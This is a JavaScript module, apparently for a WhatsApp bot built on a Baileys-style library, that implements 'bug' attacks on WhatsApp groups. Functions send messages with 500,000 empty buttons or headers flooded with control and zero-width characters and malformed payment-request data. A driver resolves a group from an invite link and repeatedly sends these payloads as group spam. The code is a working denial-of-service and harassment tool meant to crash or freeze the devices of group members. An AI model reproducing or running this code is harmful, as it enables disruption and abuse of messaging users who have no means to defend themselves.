import { generateWAMessageFromContent } from "ourin-baileys";
import { sleep, resolveGroupTarget, runGroupSpam } from "./helpers.js";
import { BUG_DELAY_MS, makeProgressLogger } from "./progress.js";

const BIG_BUTTONS = Array.from({ length: 500000 }, () => ({}));

export async function DelayGB(sock, target) {
  for (let x = 0; x < 50; x++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3,
            },
            interactiveMessage: {
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: { businessOwnerJid: target },
              },
              body: { text: "izin @mexxreall" },
              nativeFlowMessage: {
                buttons: BIG_BUTTONS,
              },
            },
          },
        },
      },
      { participant: { jid: target } }
    );
  }
}

export async function blankclickgb(sock, target) {
  const content = {
    interactiveMessage: {
      header: {
        title: "izin @mexxreall".repeat(1000),
        subtitle: "\u0010".repeat(1000),
        hasMediaAttachment: false,
        bloksWidget: {
          fallback: "\u200D".repeat(1000),
          type: "\u200F".repeat(1000),
          data: "[".repeat(1000),
          uuid: "\u200B".repeat(1000),
        },
      },
      body: { text: "\u000F" },
      footer: { text: "\u200B" },
      nativeFlowMessage: {
        messageVersion: 1,
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson:
              '{"currency":"IDR","payment_type":"upr","total_amount":{"value":0,"offset":100},"reference_id":"4WA9RALEPXA","type":"physical-goods","order":{"status":"pending","order_type":"PAYMENT_REQUEST"},"payment_settings":[{"type":"payment_account","payment_account":{"account_type":"digital_wallet","identifier_type":"phone_number","identifier_value":"088983102983","institution_name":"Dana","beneficiary_name":"izin @mexxreall "}},{"type":"payment_account","payment_account":{"account_type":"digital_wallet","identifier_type":"phone_number","identifier_value":"088983102983","institution_name":"GoPay","beneficiary_name":"izin @mexxreall "}}],"share_payment_status":false,"is_soft_deleted":false}',
          },
        ],
      },
      contextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
      },
    },
  };

  const message = await generateWAMessageFromContent(target, content, {});

  await sock.relayMessage(target, message.message, {
    messageId: message.key.id,
    participant: { jid: target },
  });
}

export async function sendGroupBugFromLink(sock, link, combo = "delay", opts = {}) {
  const target = await resolveGroupTarget(sock, link);
  const totalLoop = opts.totalLoop ?? 55;
  const delayMs = opts.delayMs ?? BUG_DELAY_MS;
  const onProgress = makeProgressLogger(opts.logger, `group-${combo}`, totalLoop);

  const step = async (t) => {
    if (combo === "blank") {
      await blankclickgb(sock, t);
      await sleep(delayMs);
      await blankclickgb(sock, t);
    } else if (combo === "combo") {
      await blankclickgb(sock, t);
      await sleep(delayMs);
      await DelayGB(sock, t);
    } else {
      await DelayGB(sock, t);
      await sleep(delayMs);
      await DelayGB(sock, t);
    }
  };

  return {
    target,
    ...(await runGroupSpam(sock, target, step, {
      totalLoop,
      delayMs,
      logger: opts.logger,
      onProgress: (done) => onProgress(done),
    })),
  };
}

export const sendGroupBlank = (sock, link, opts) => sendGroupBugFromLink(sock, link, "blank", opts);
export const sendGroupDelay = (sock, link, opts) => sendGroupBugFromLink(sock, link, "delay", opts);
export const sendGroupCombo = (sock, link, opts) => sendGroupBugFromLink(sock, link, "combo", opts);

export async function sendBandGroup(sock, link, { targetMeta = "13135550002@s.whatsapp.net" } = {}) {
  const target = await resolveGroupTarget(sock, link);
  await sock.groupParticipantsUpdate(target, [targetMeta], "add");
  return target;
}
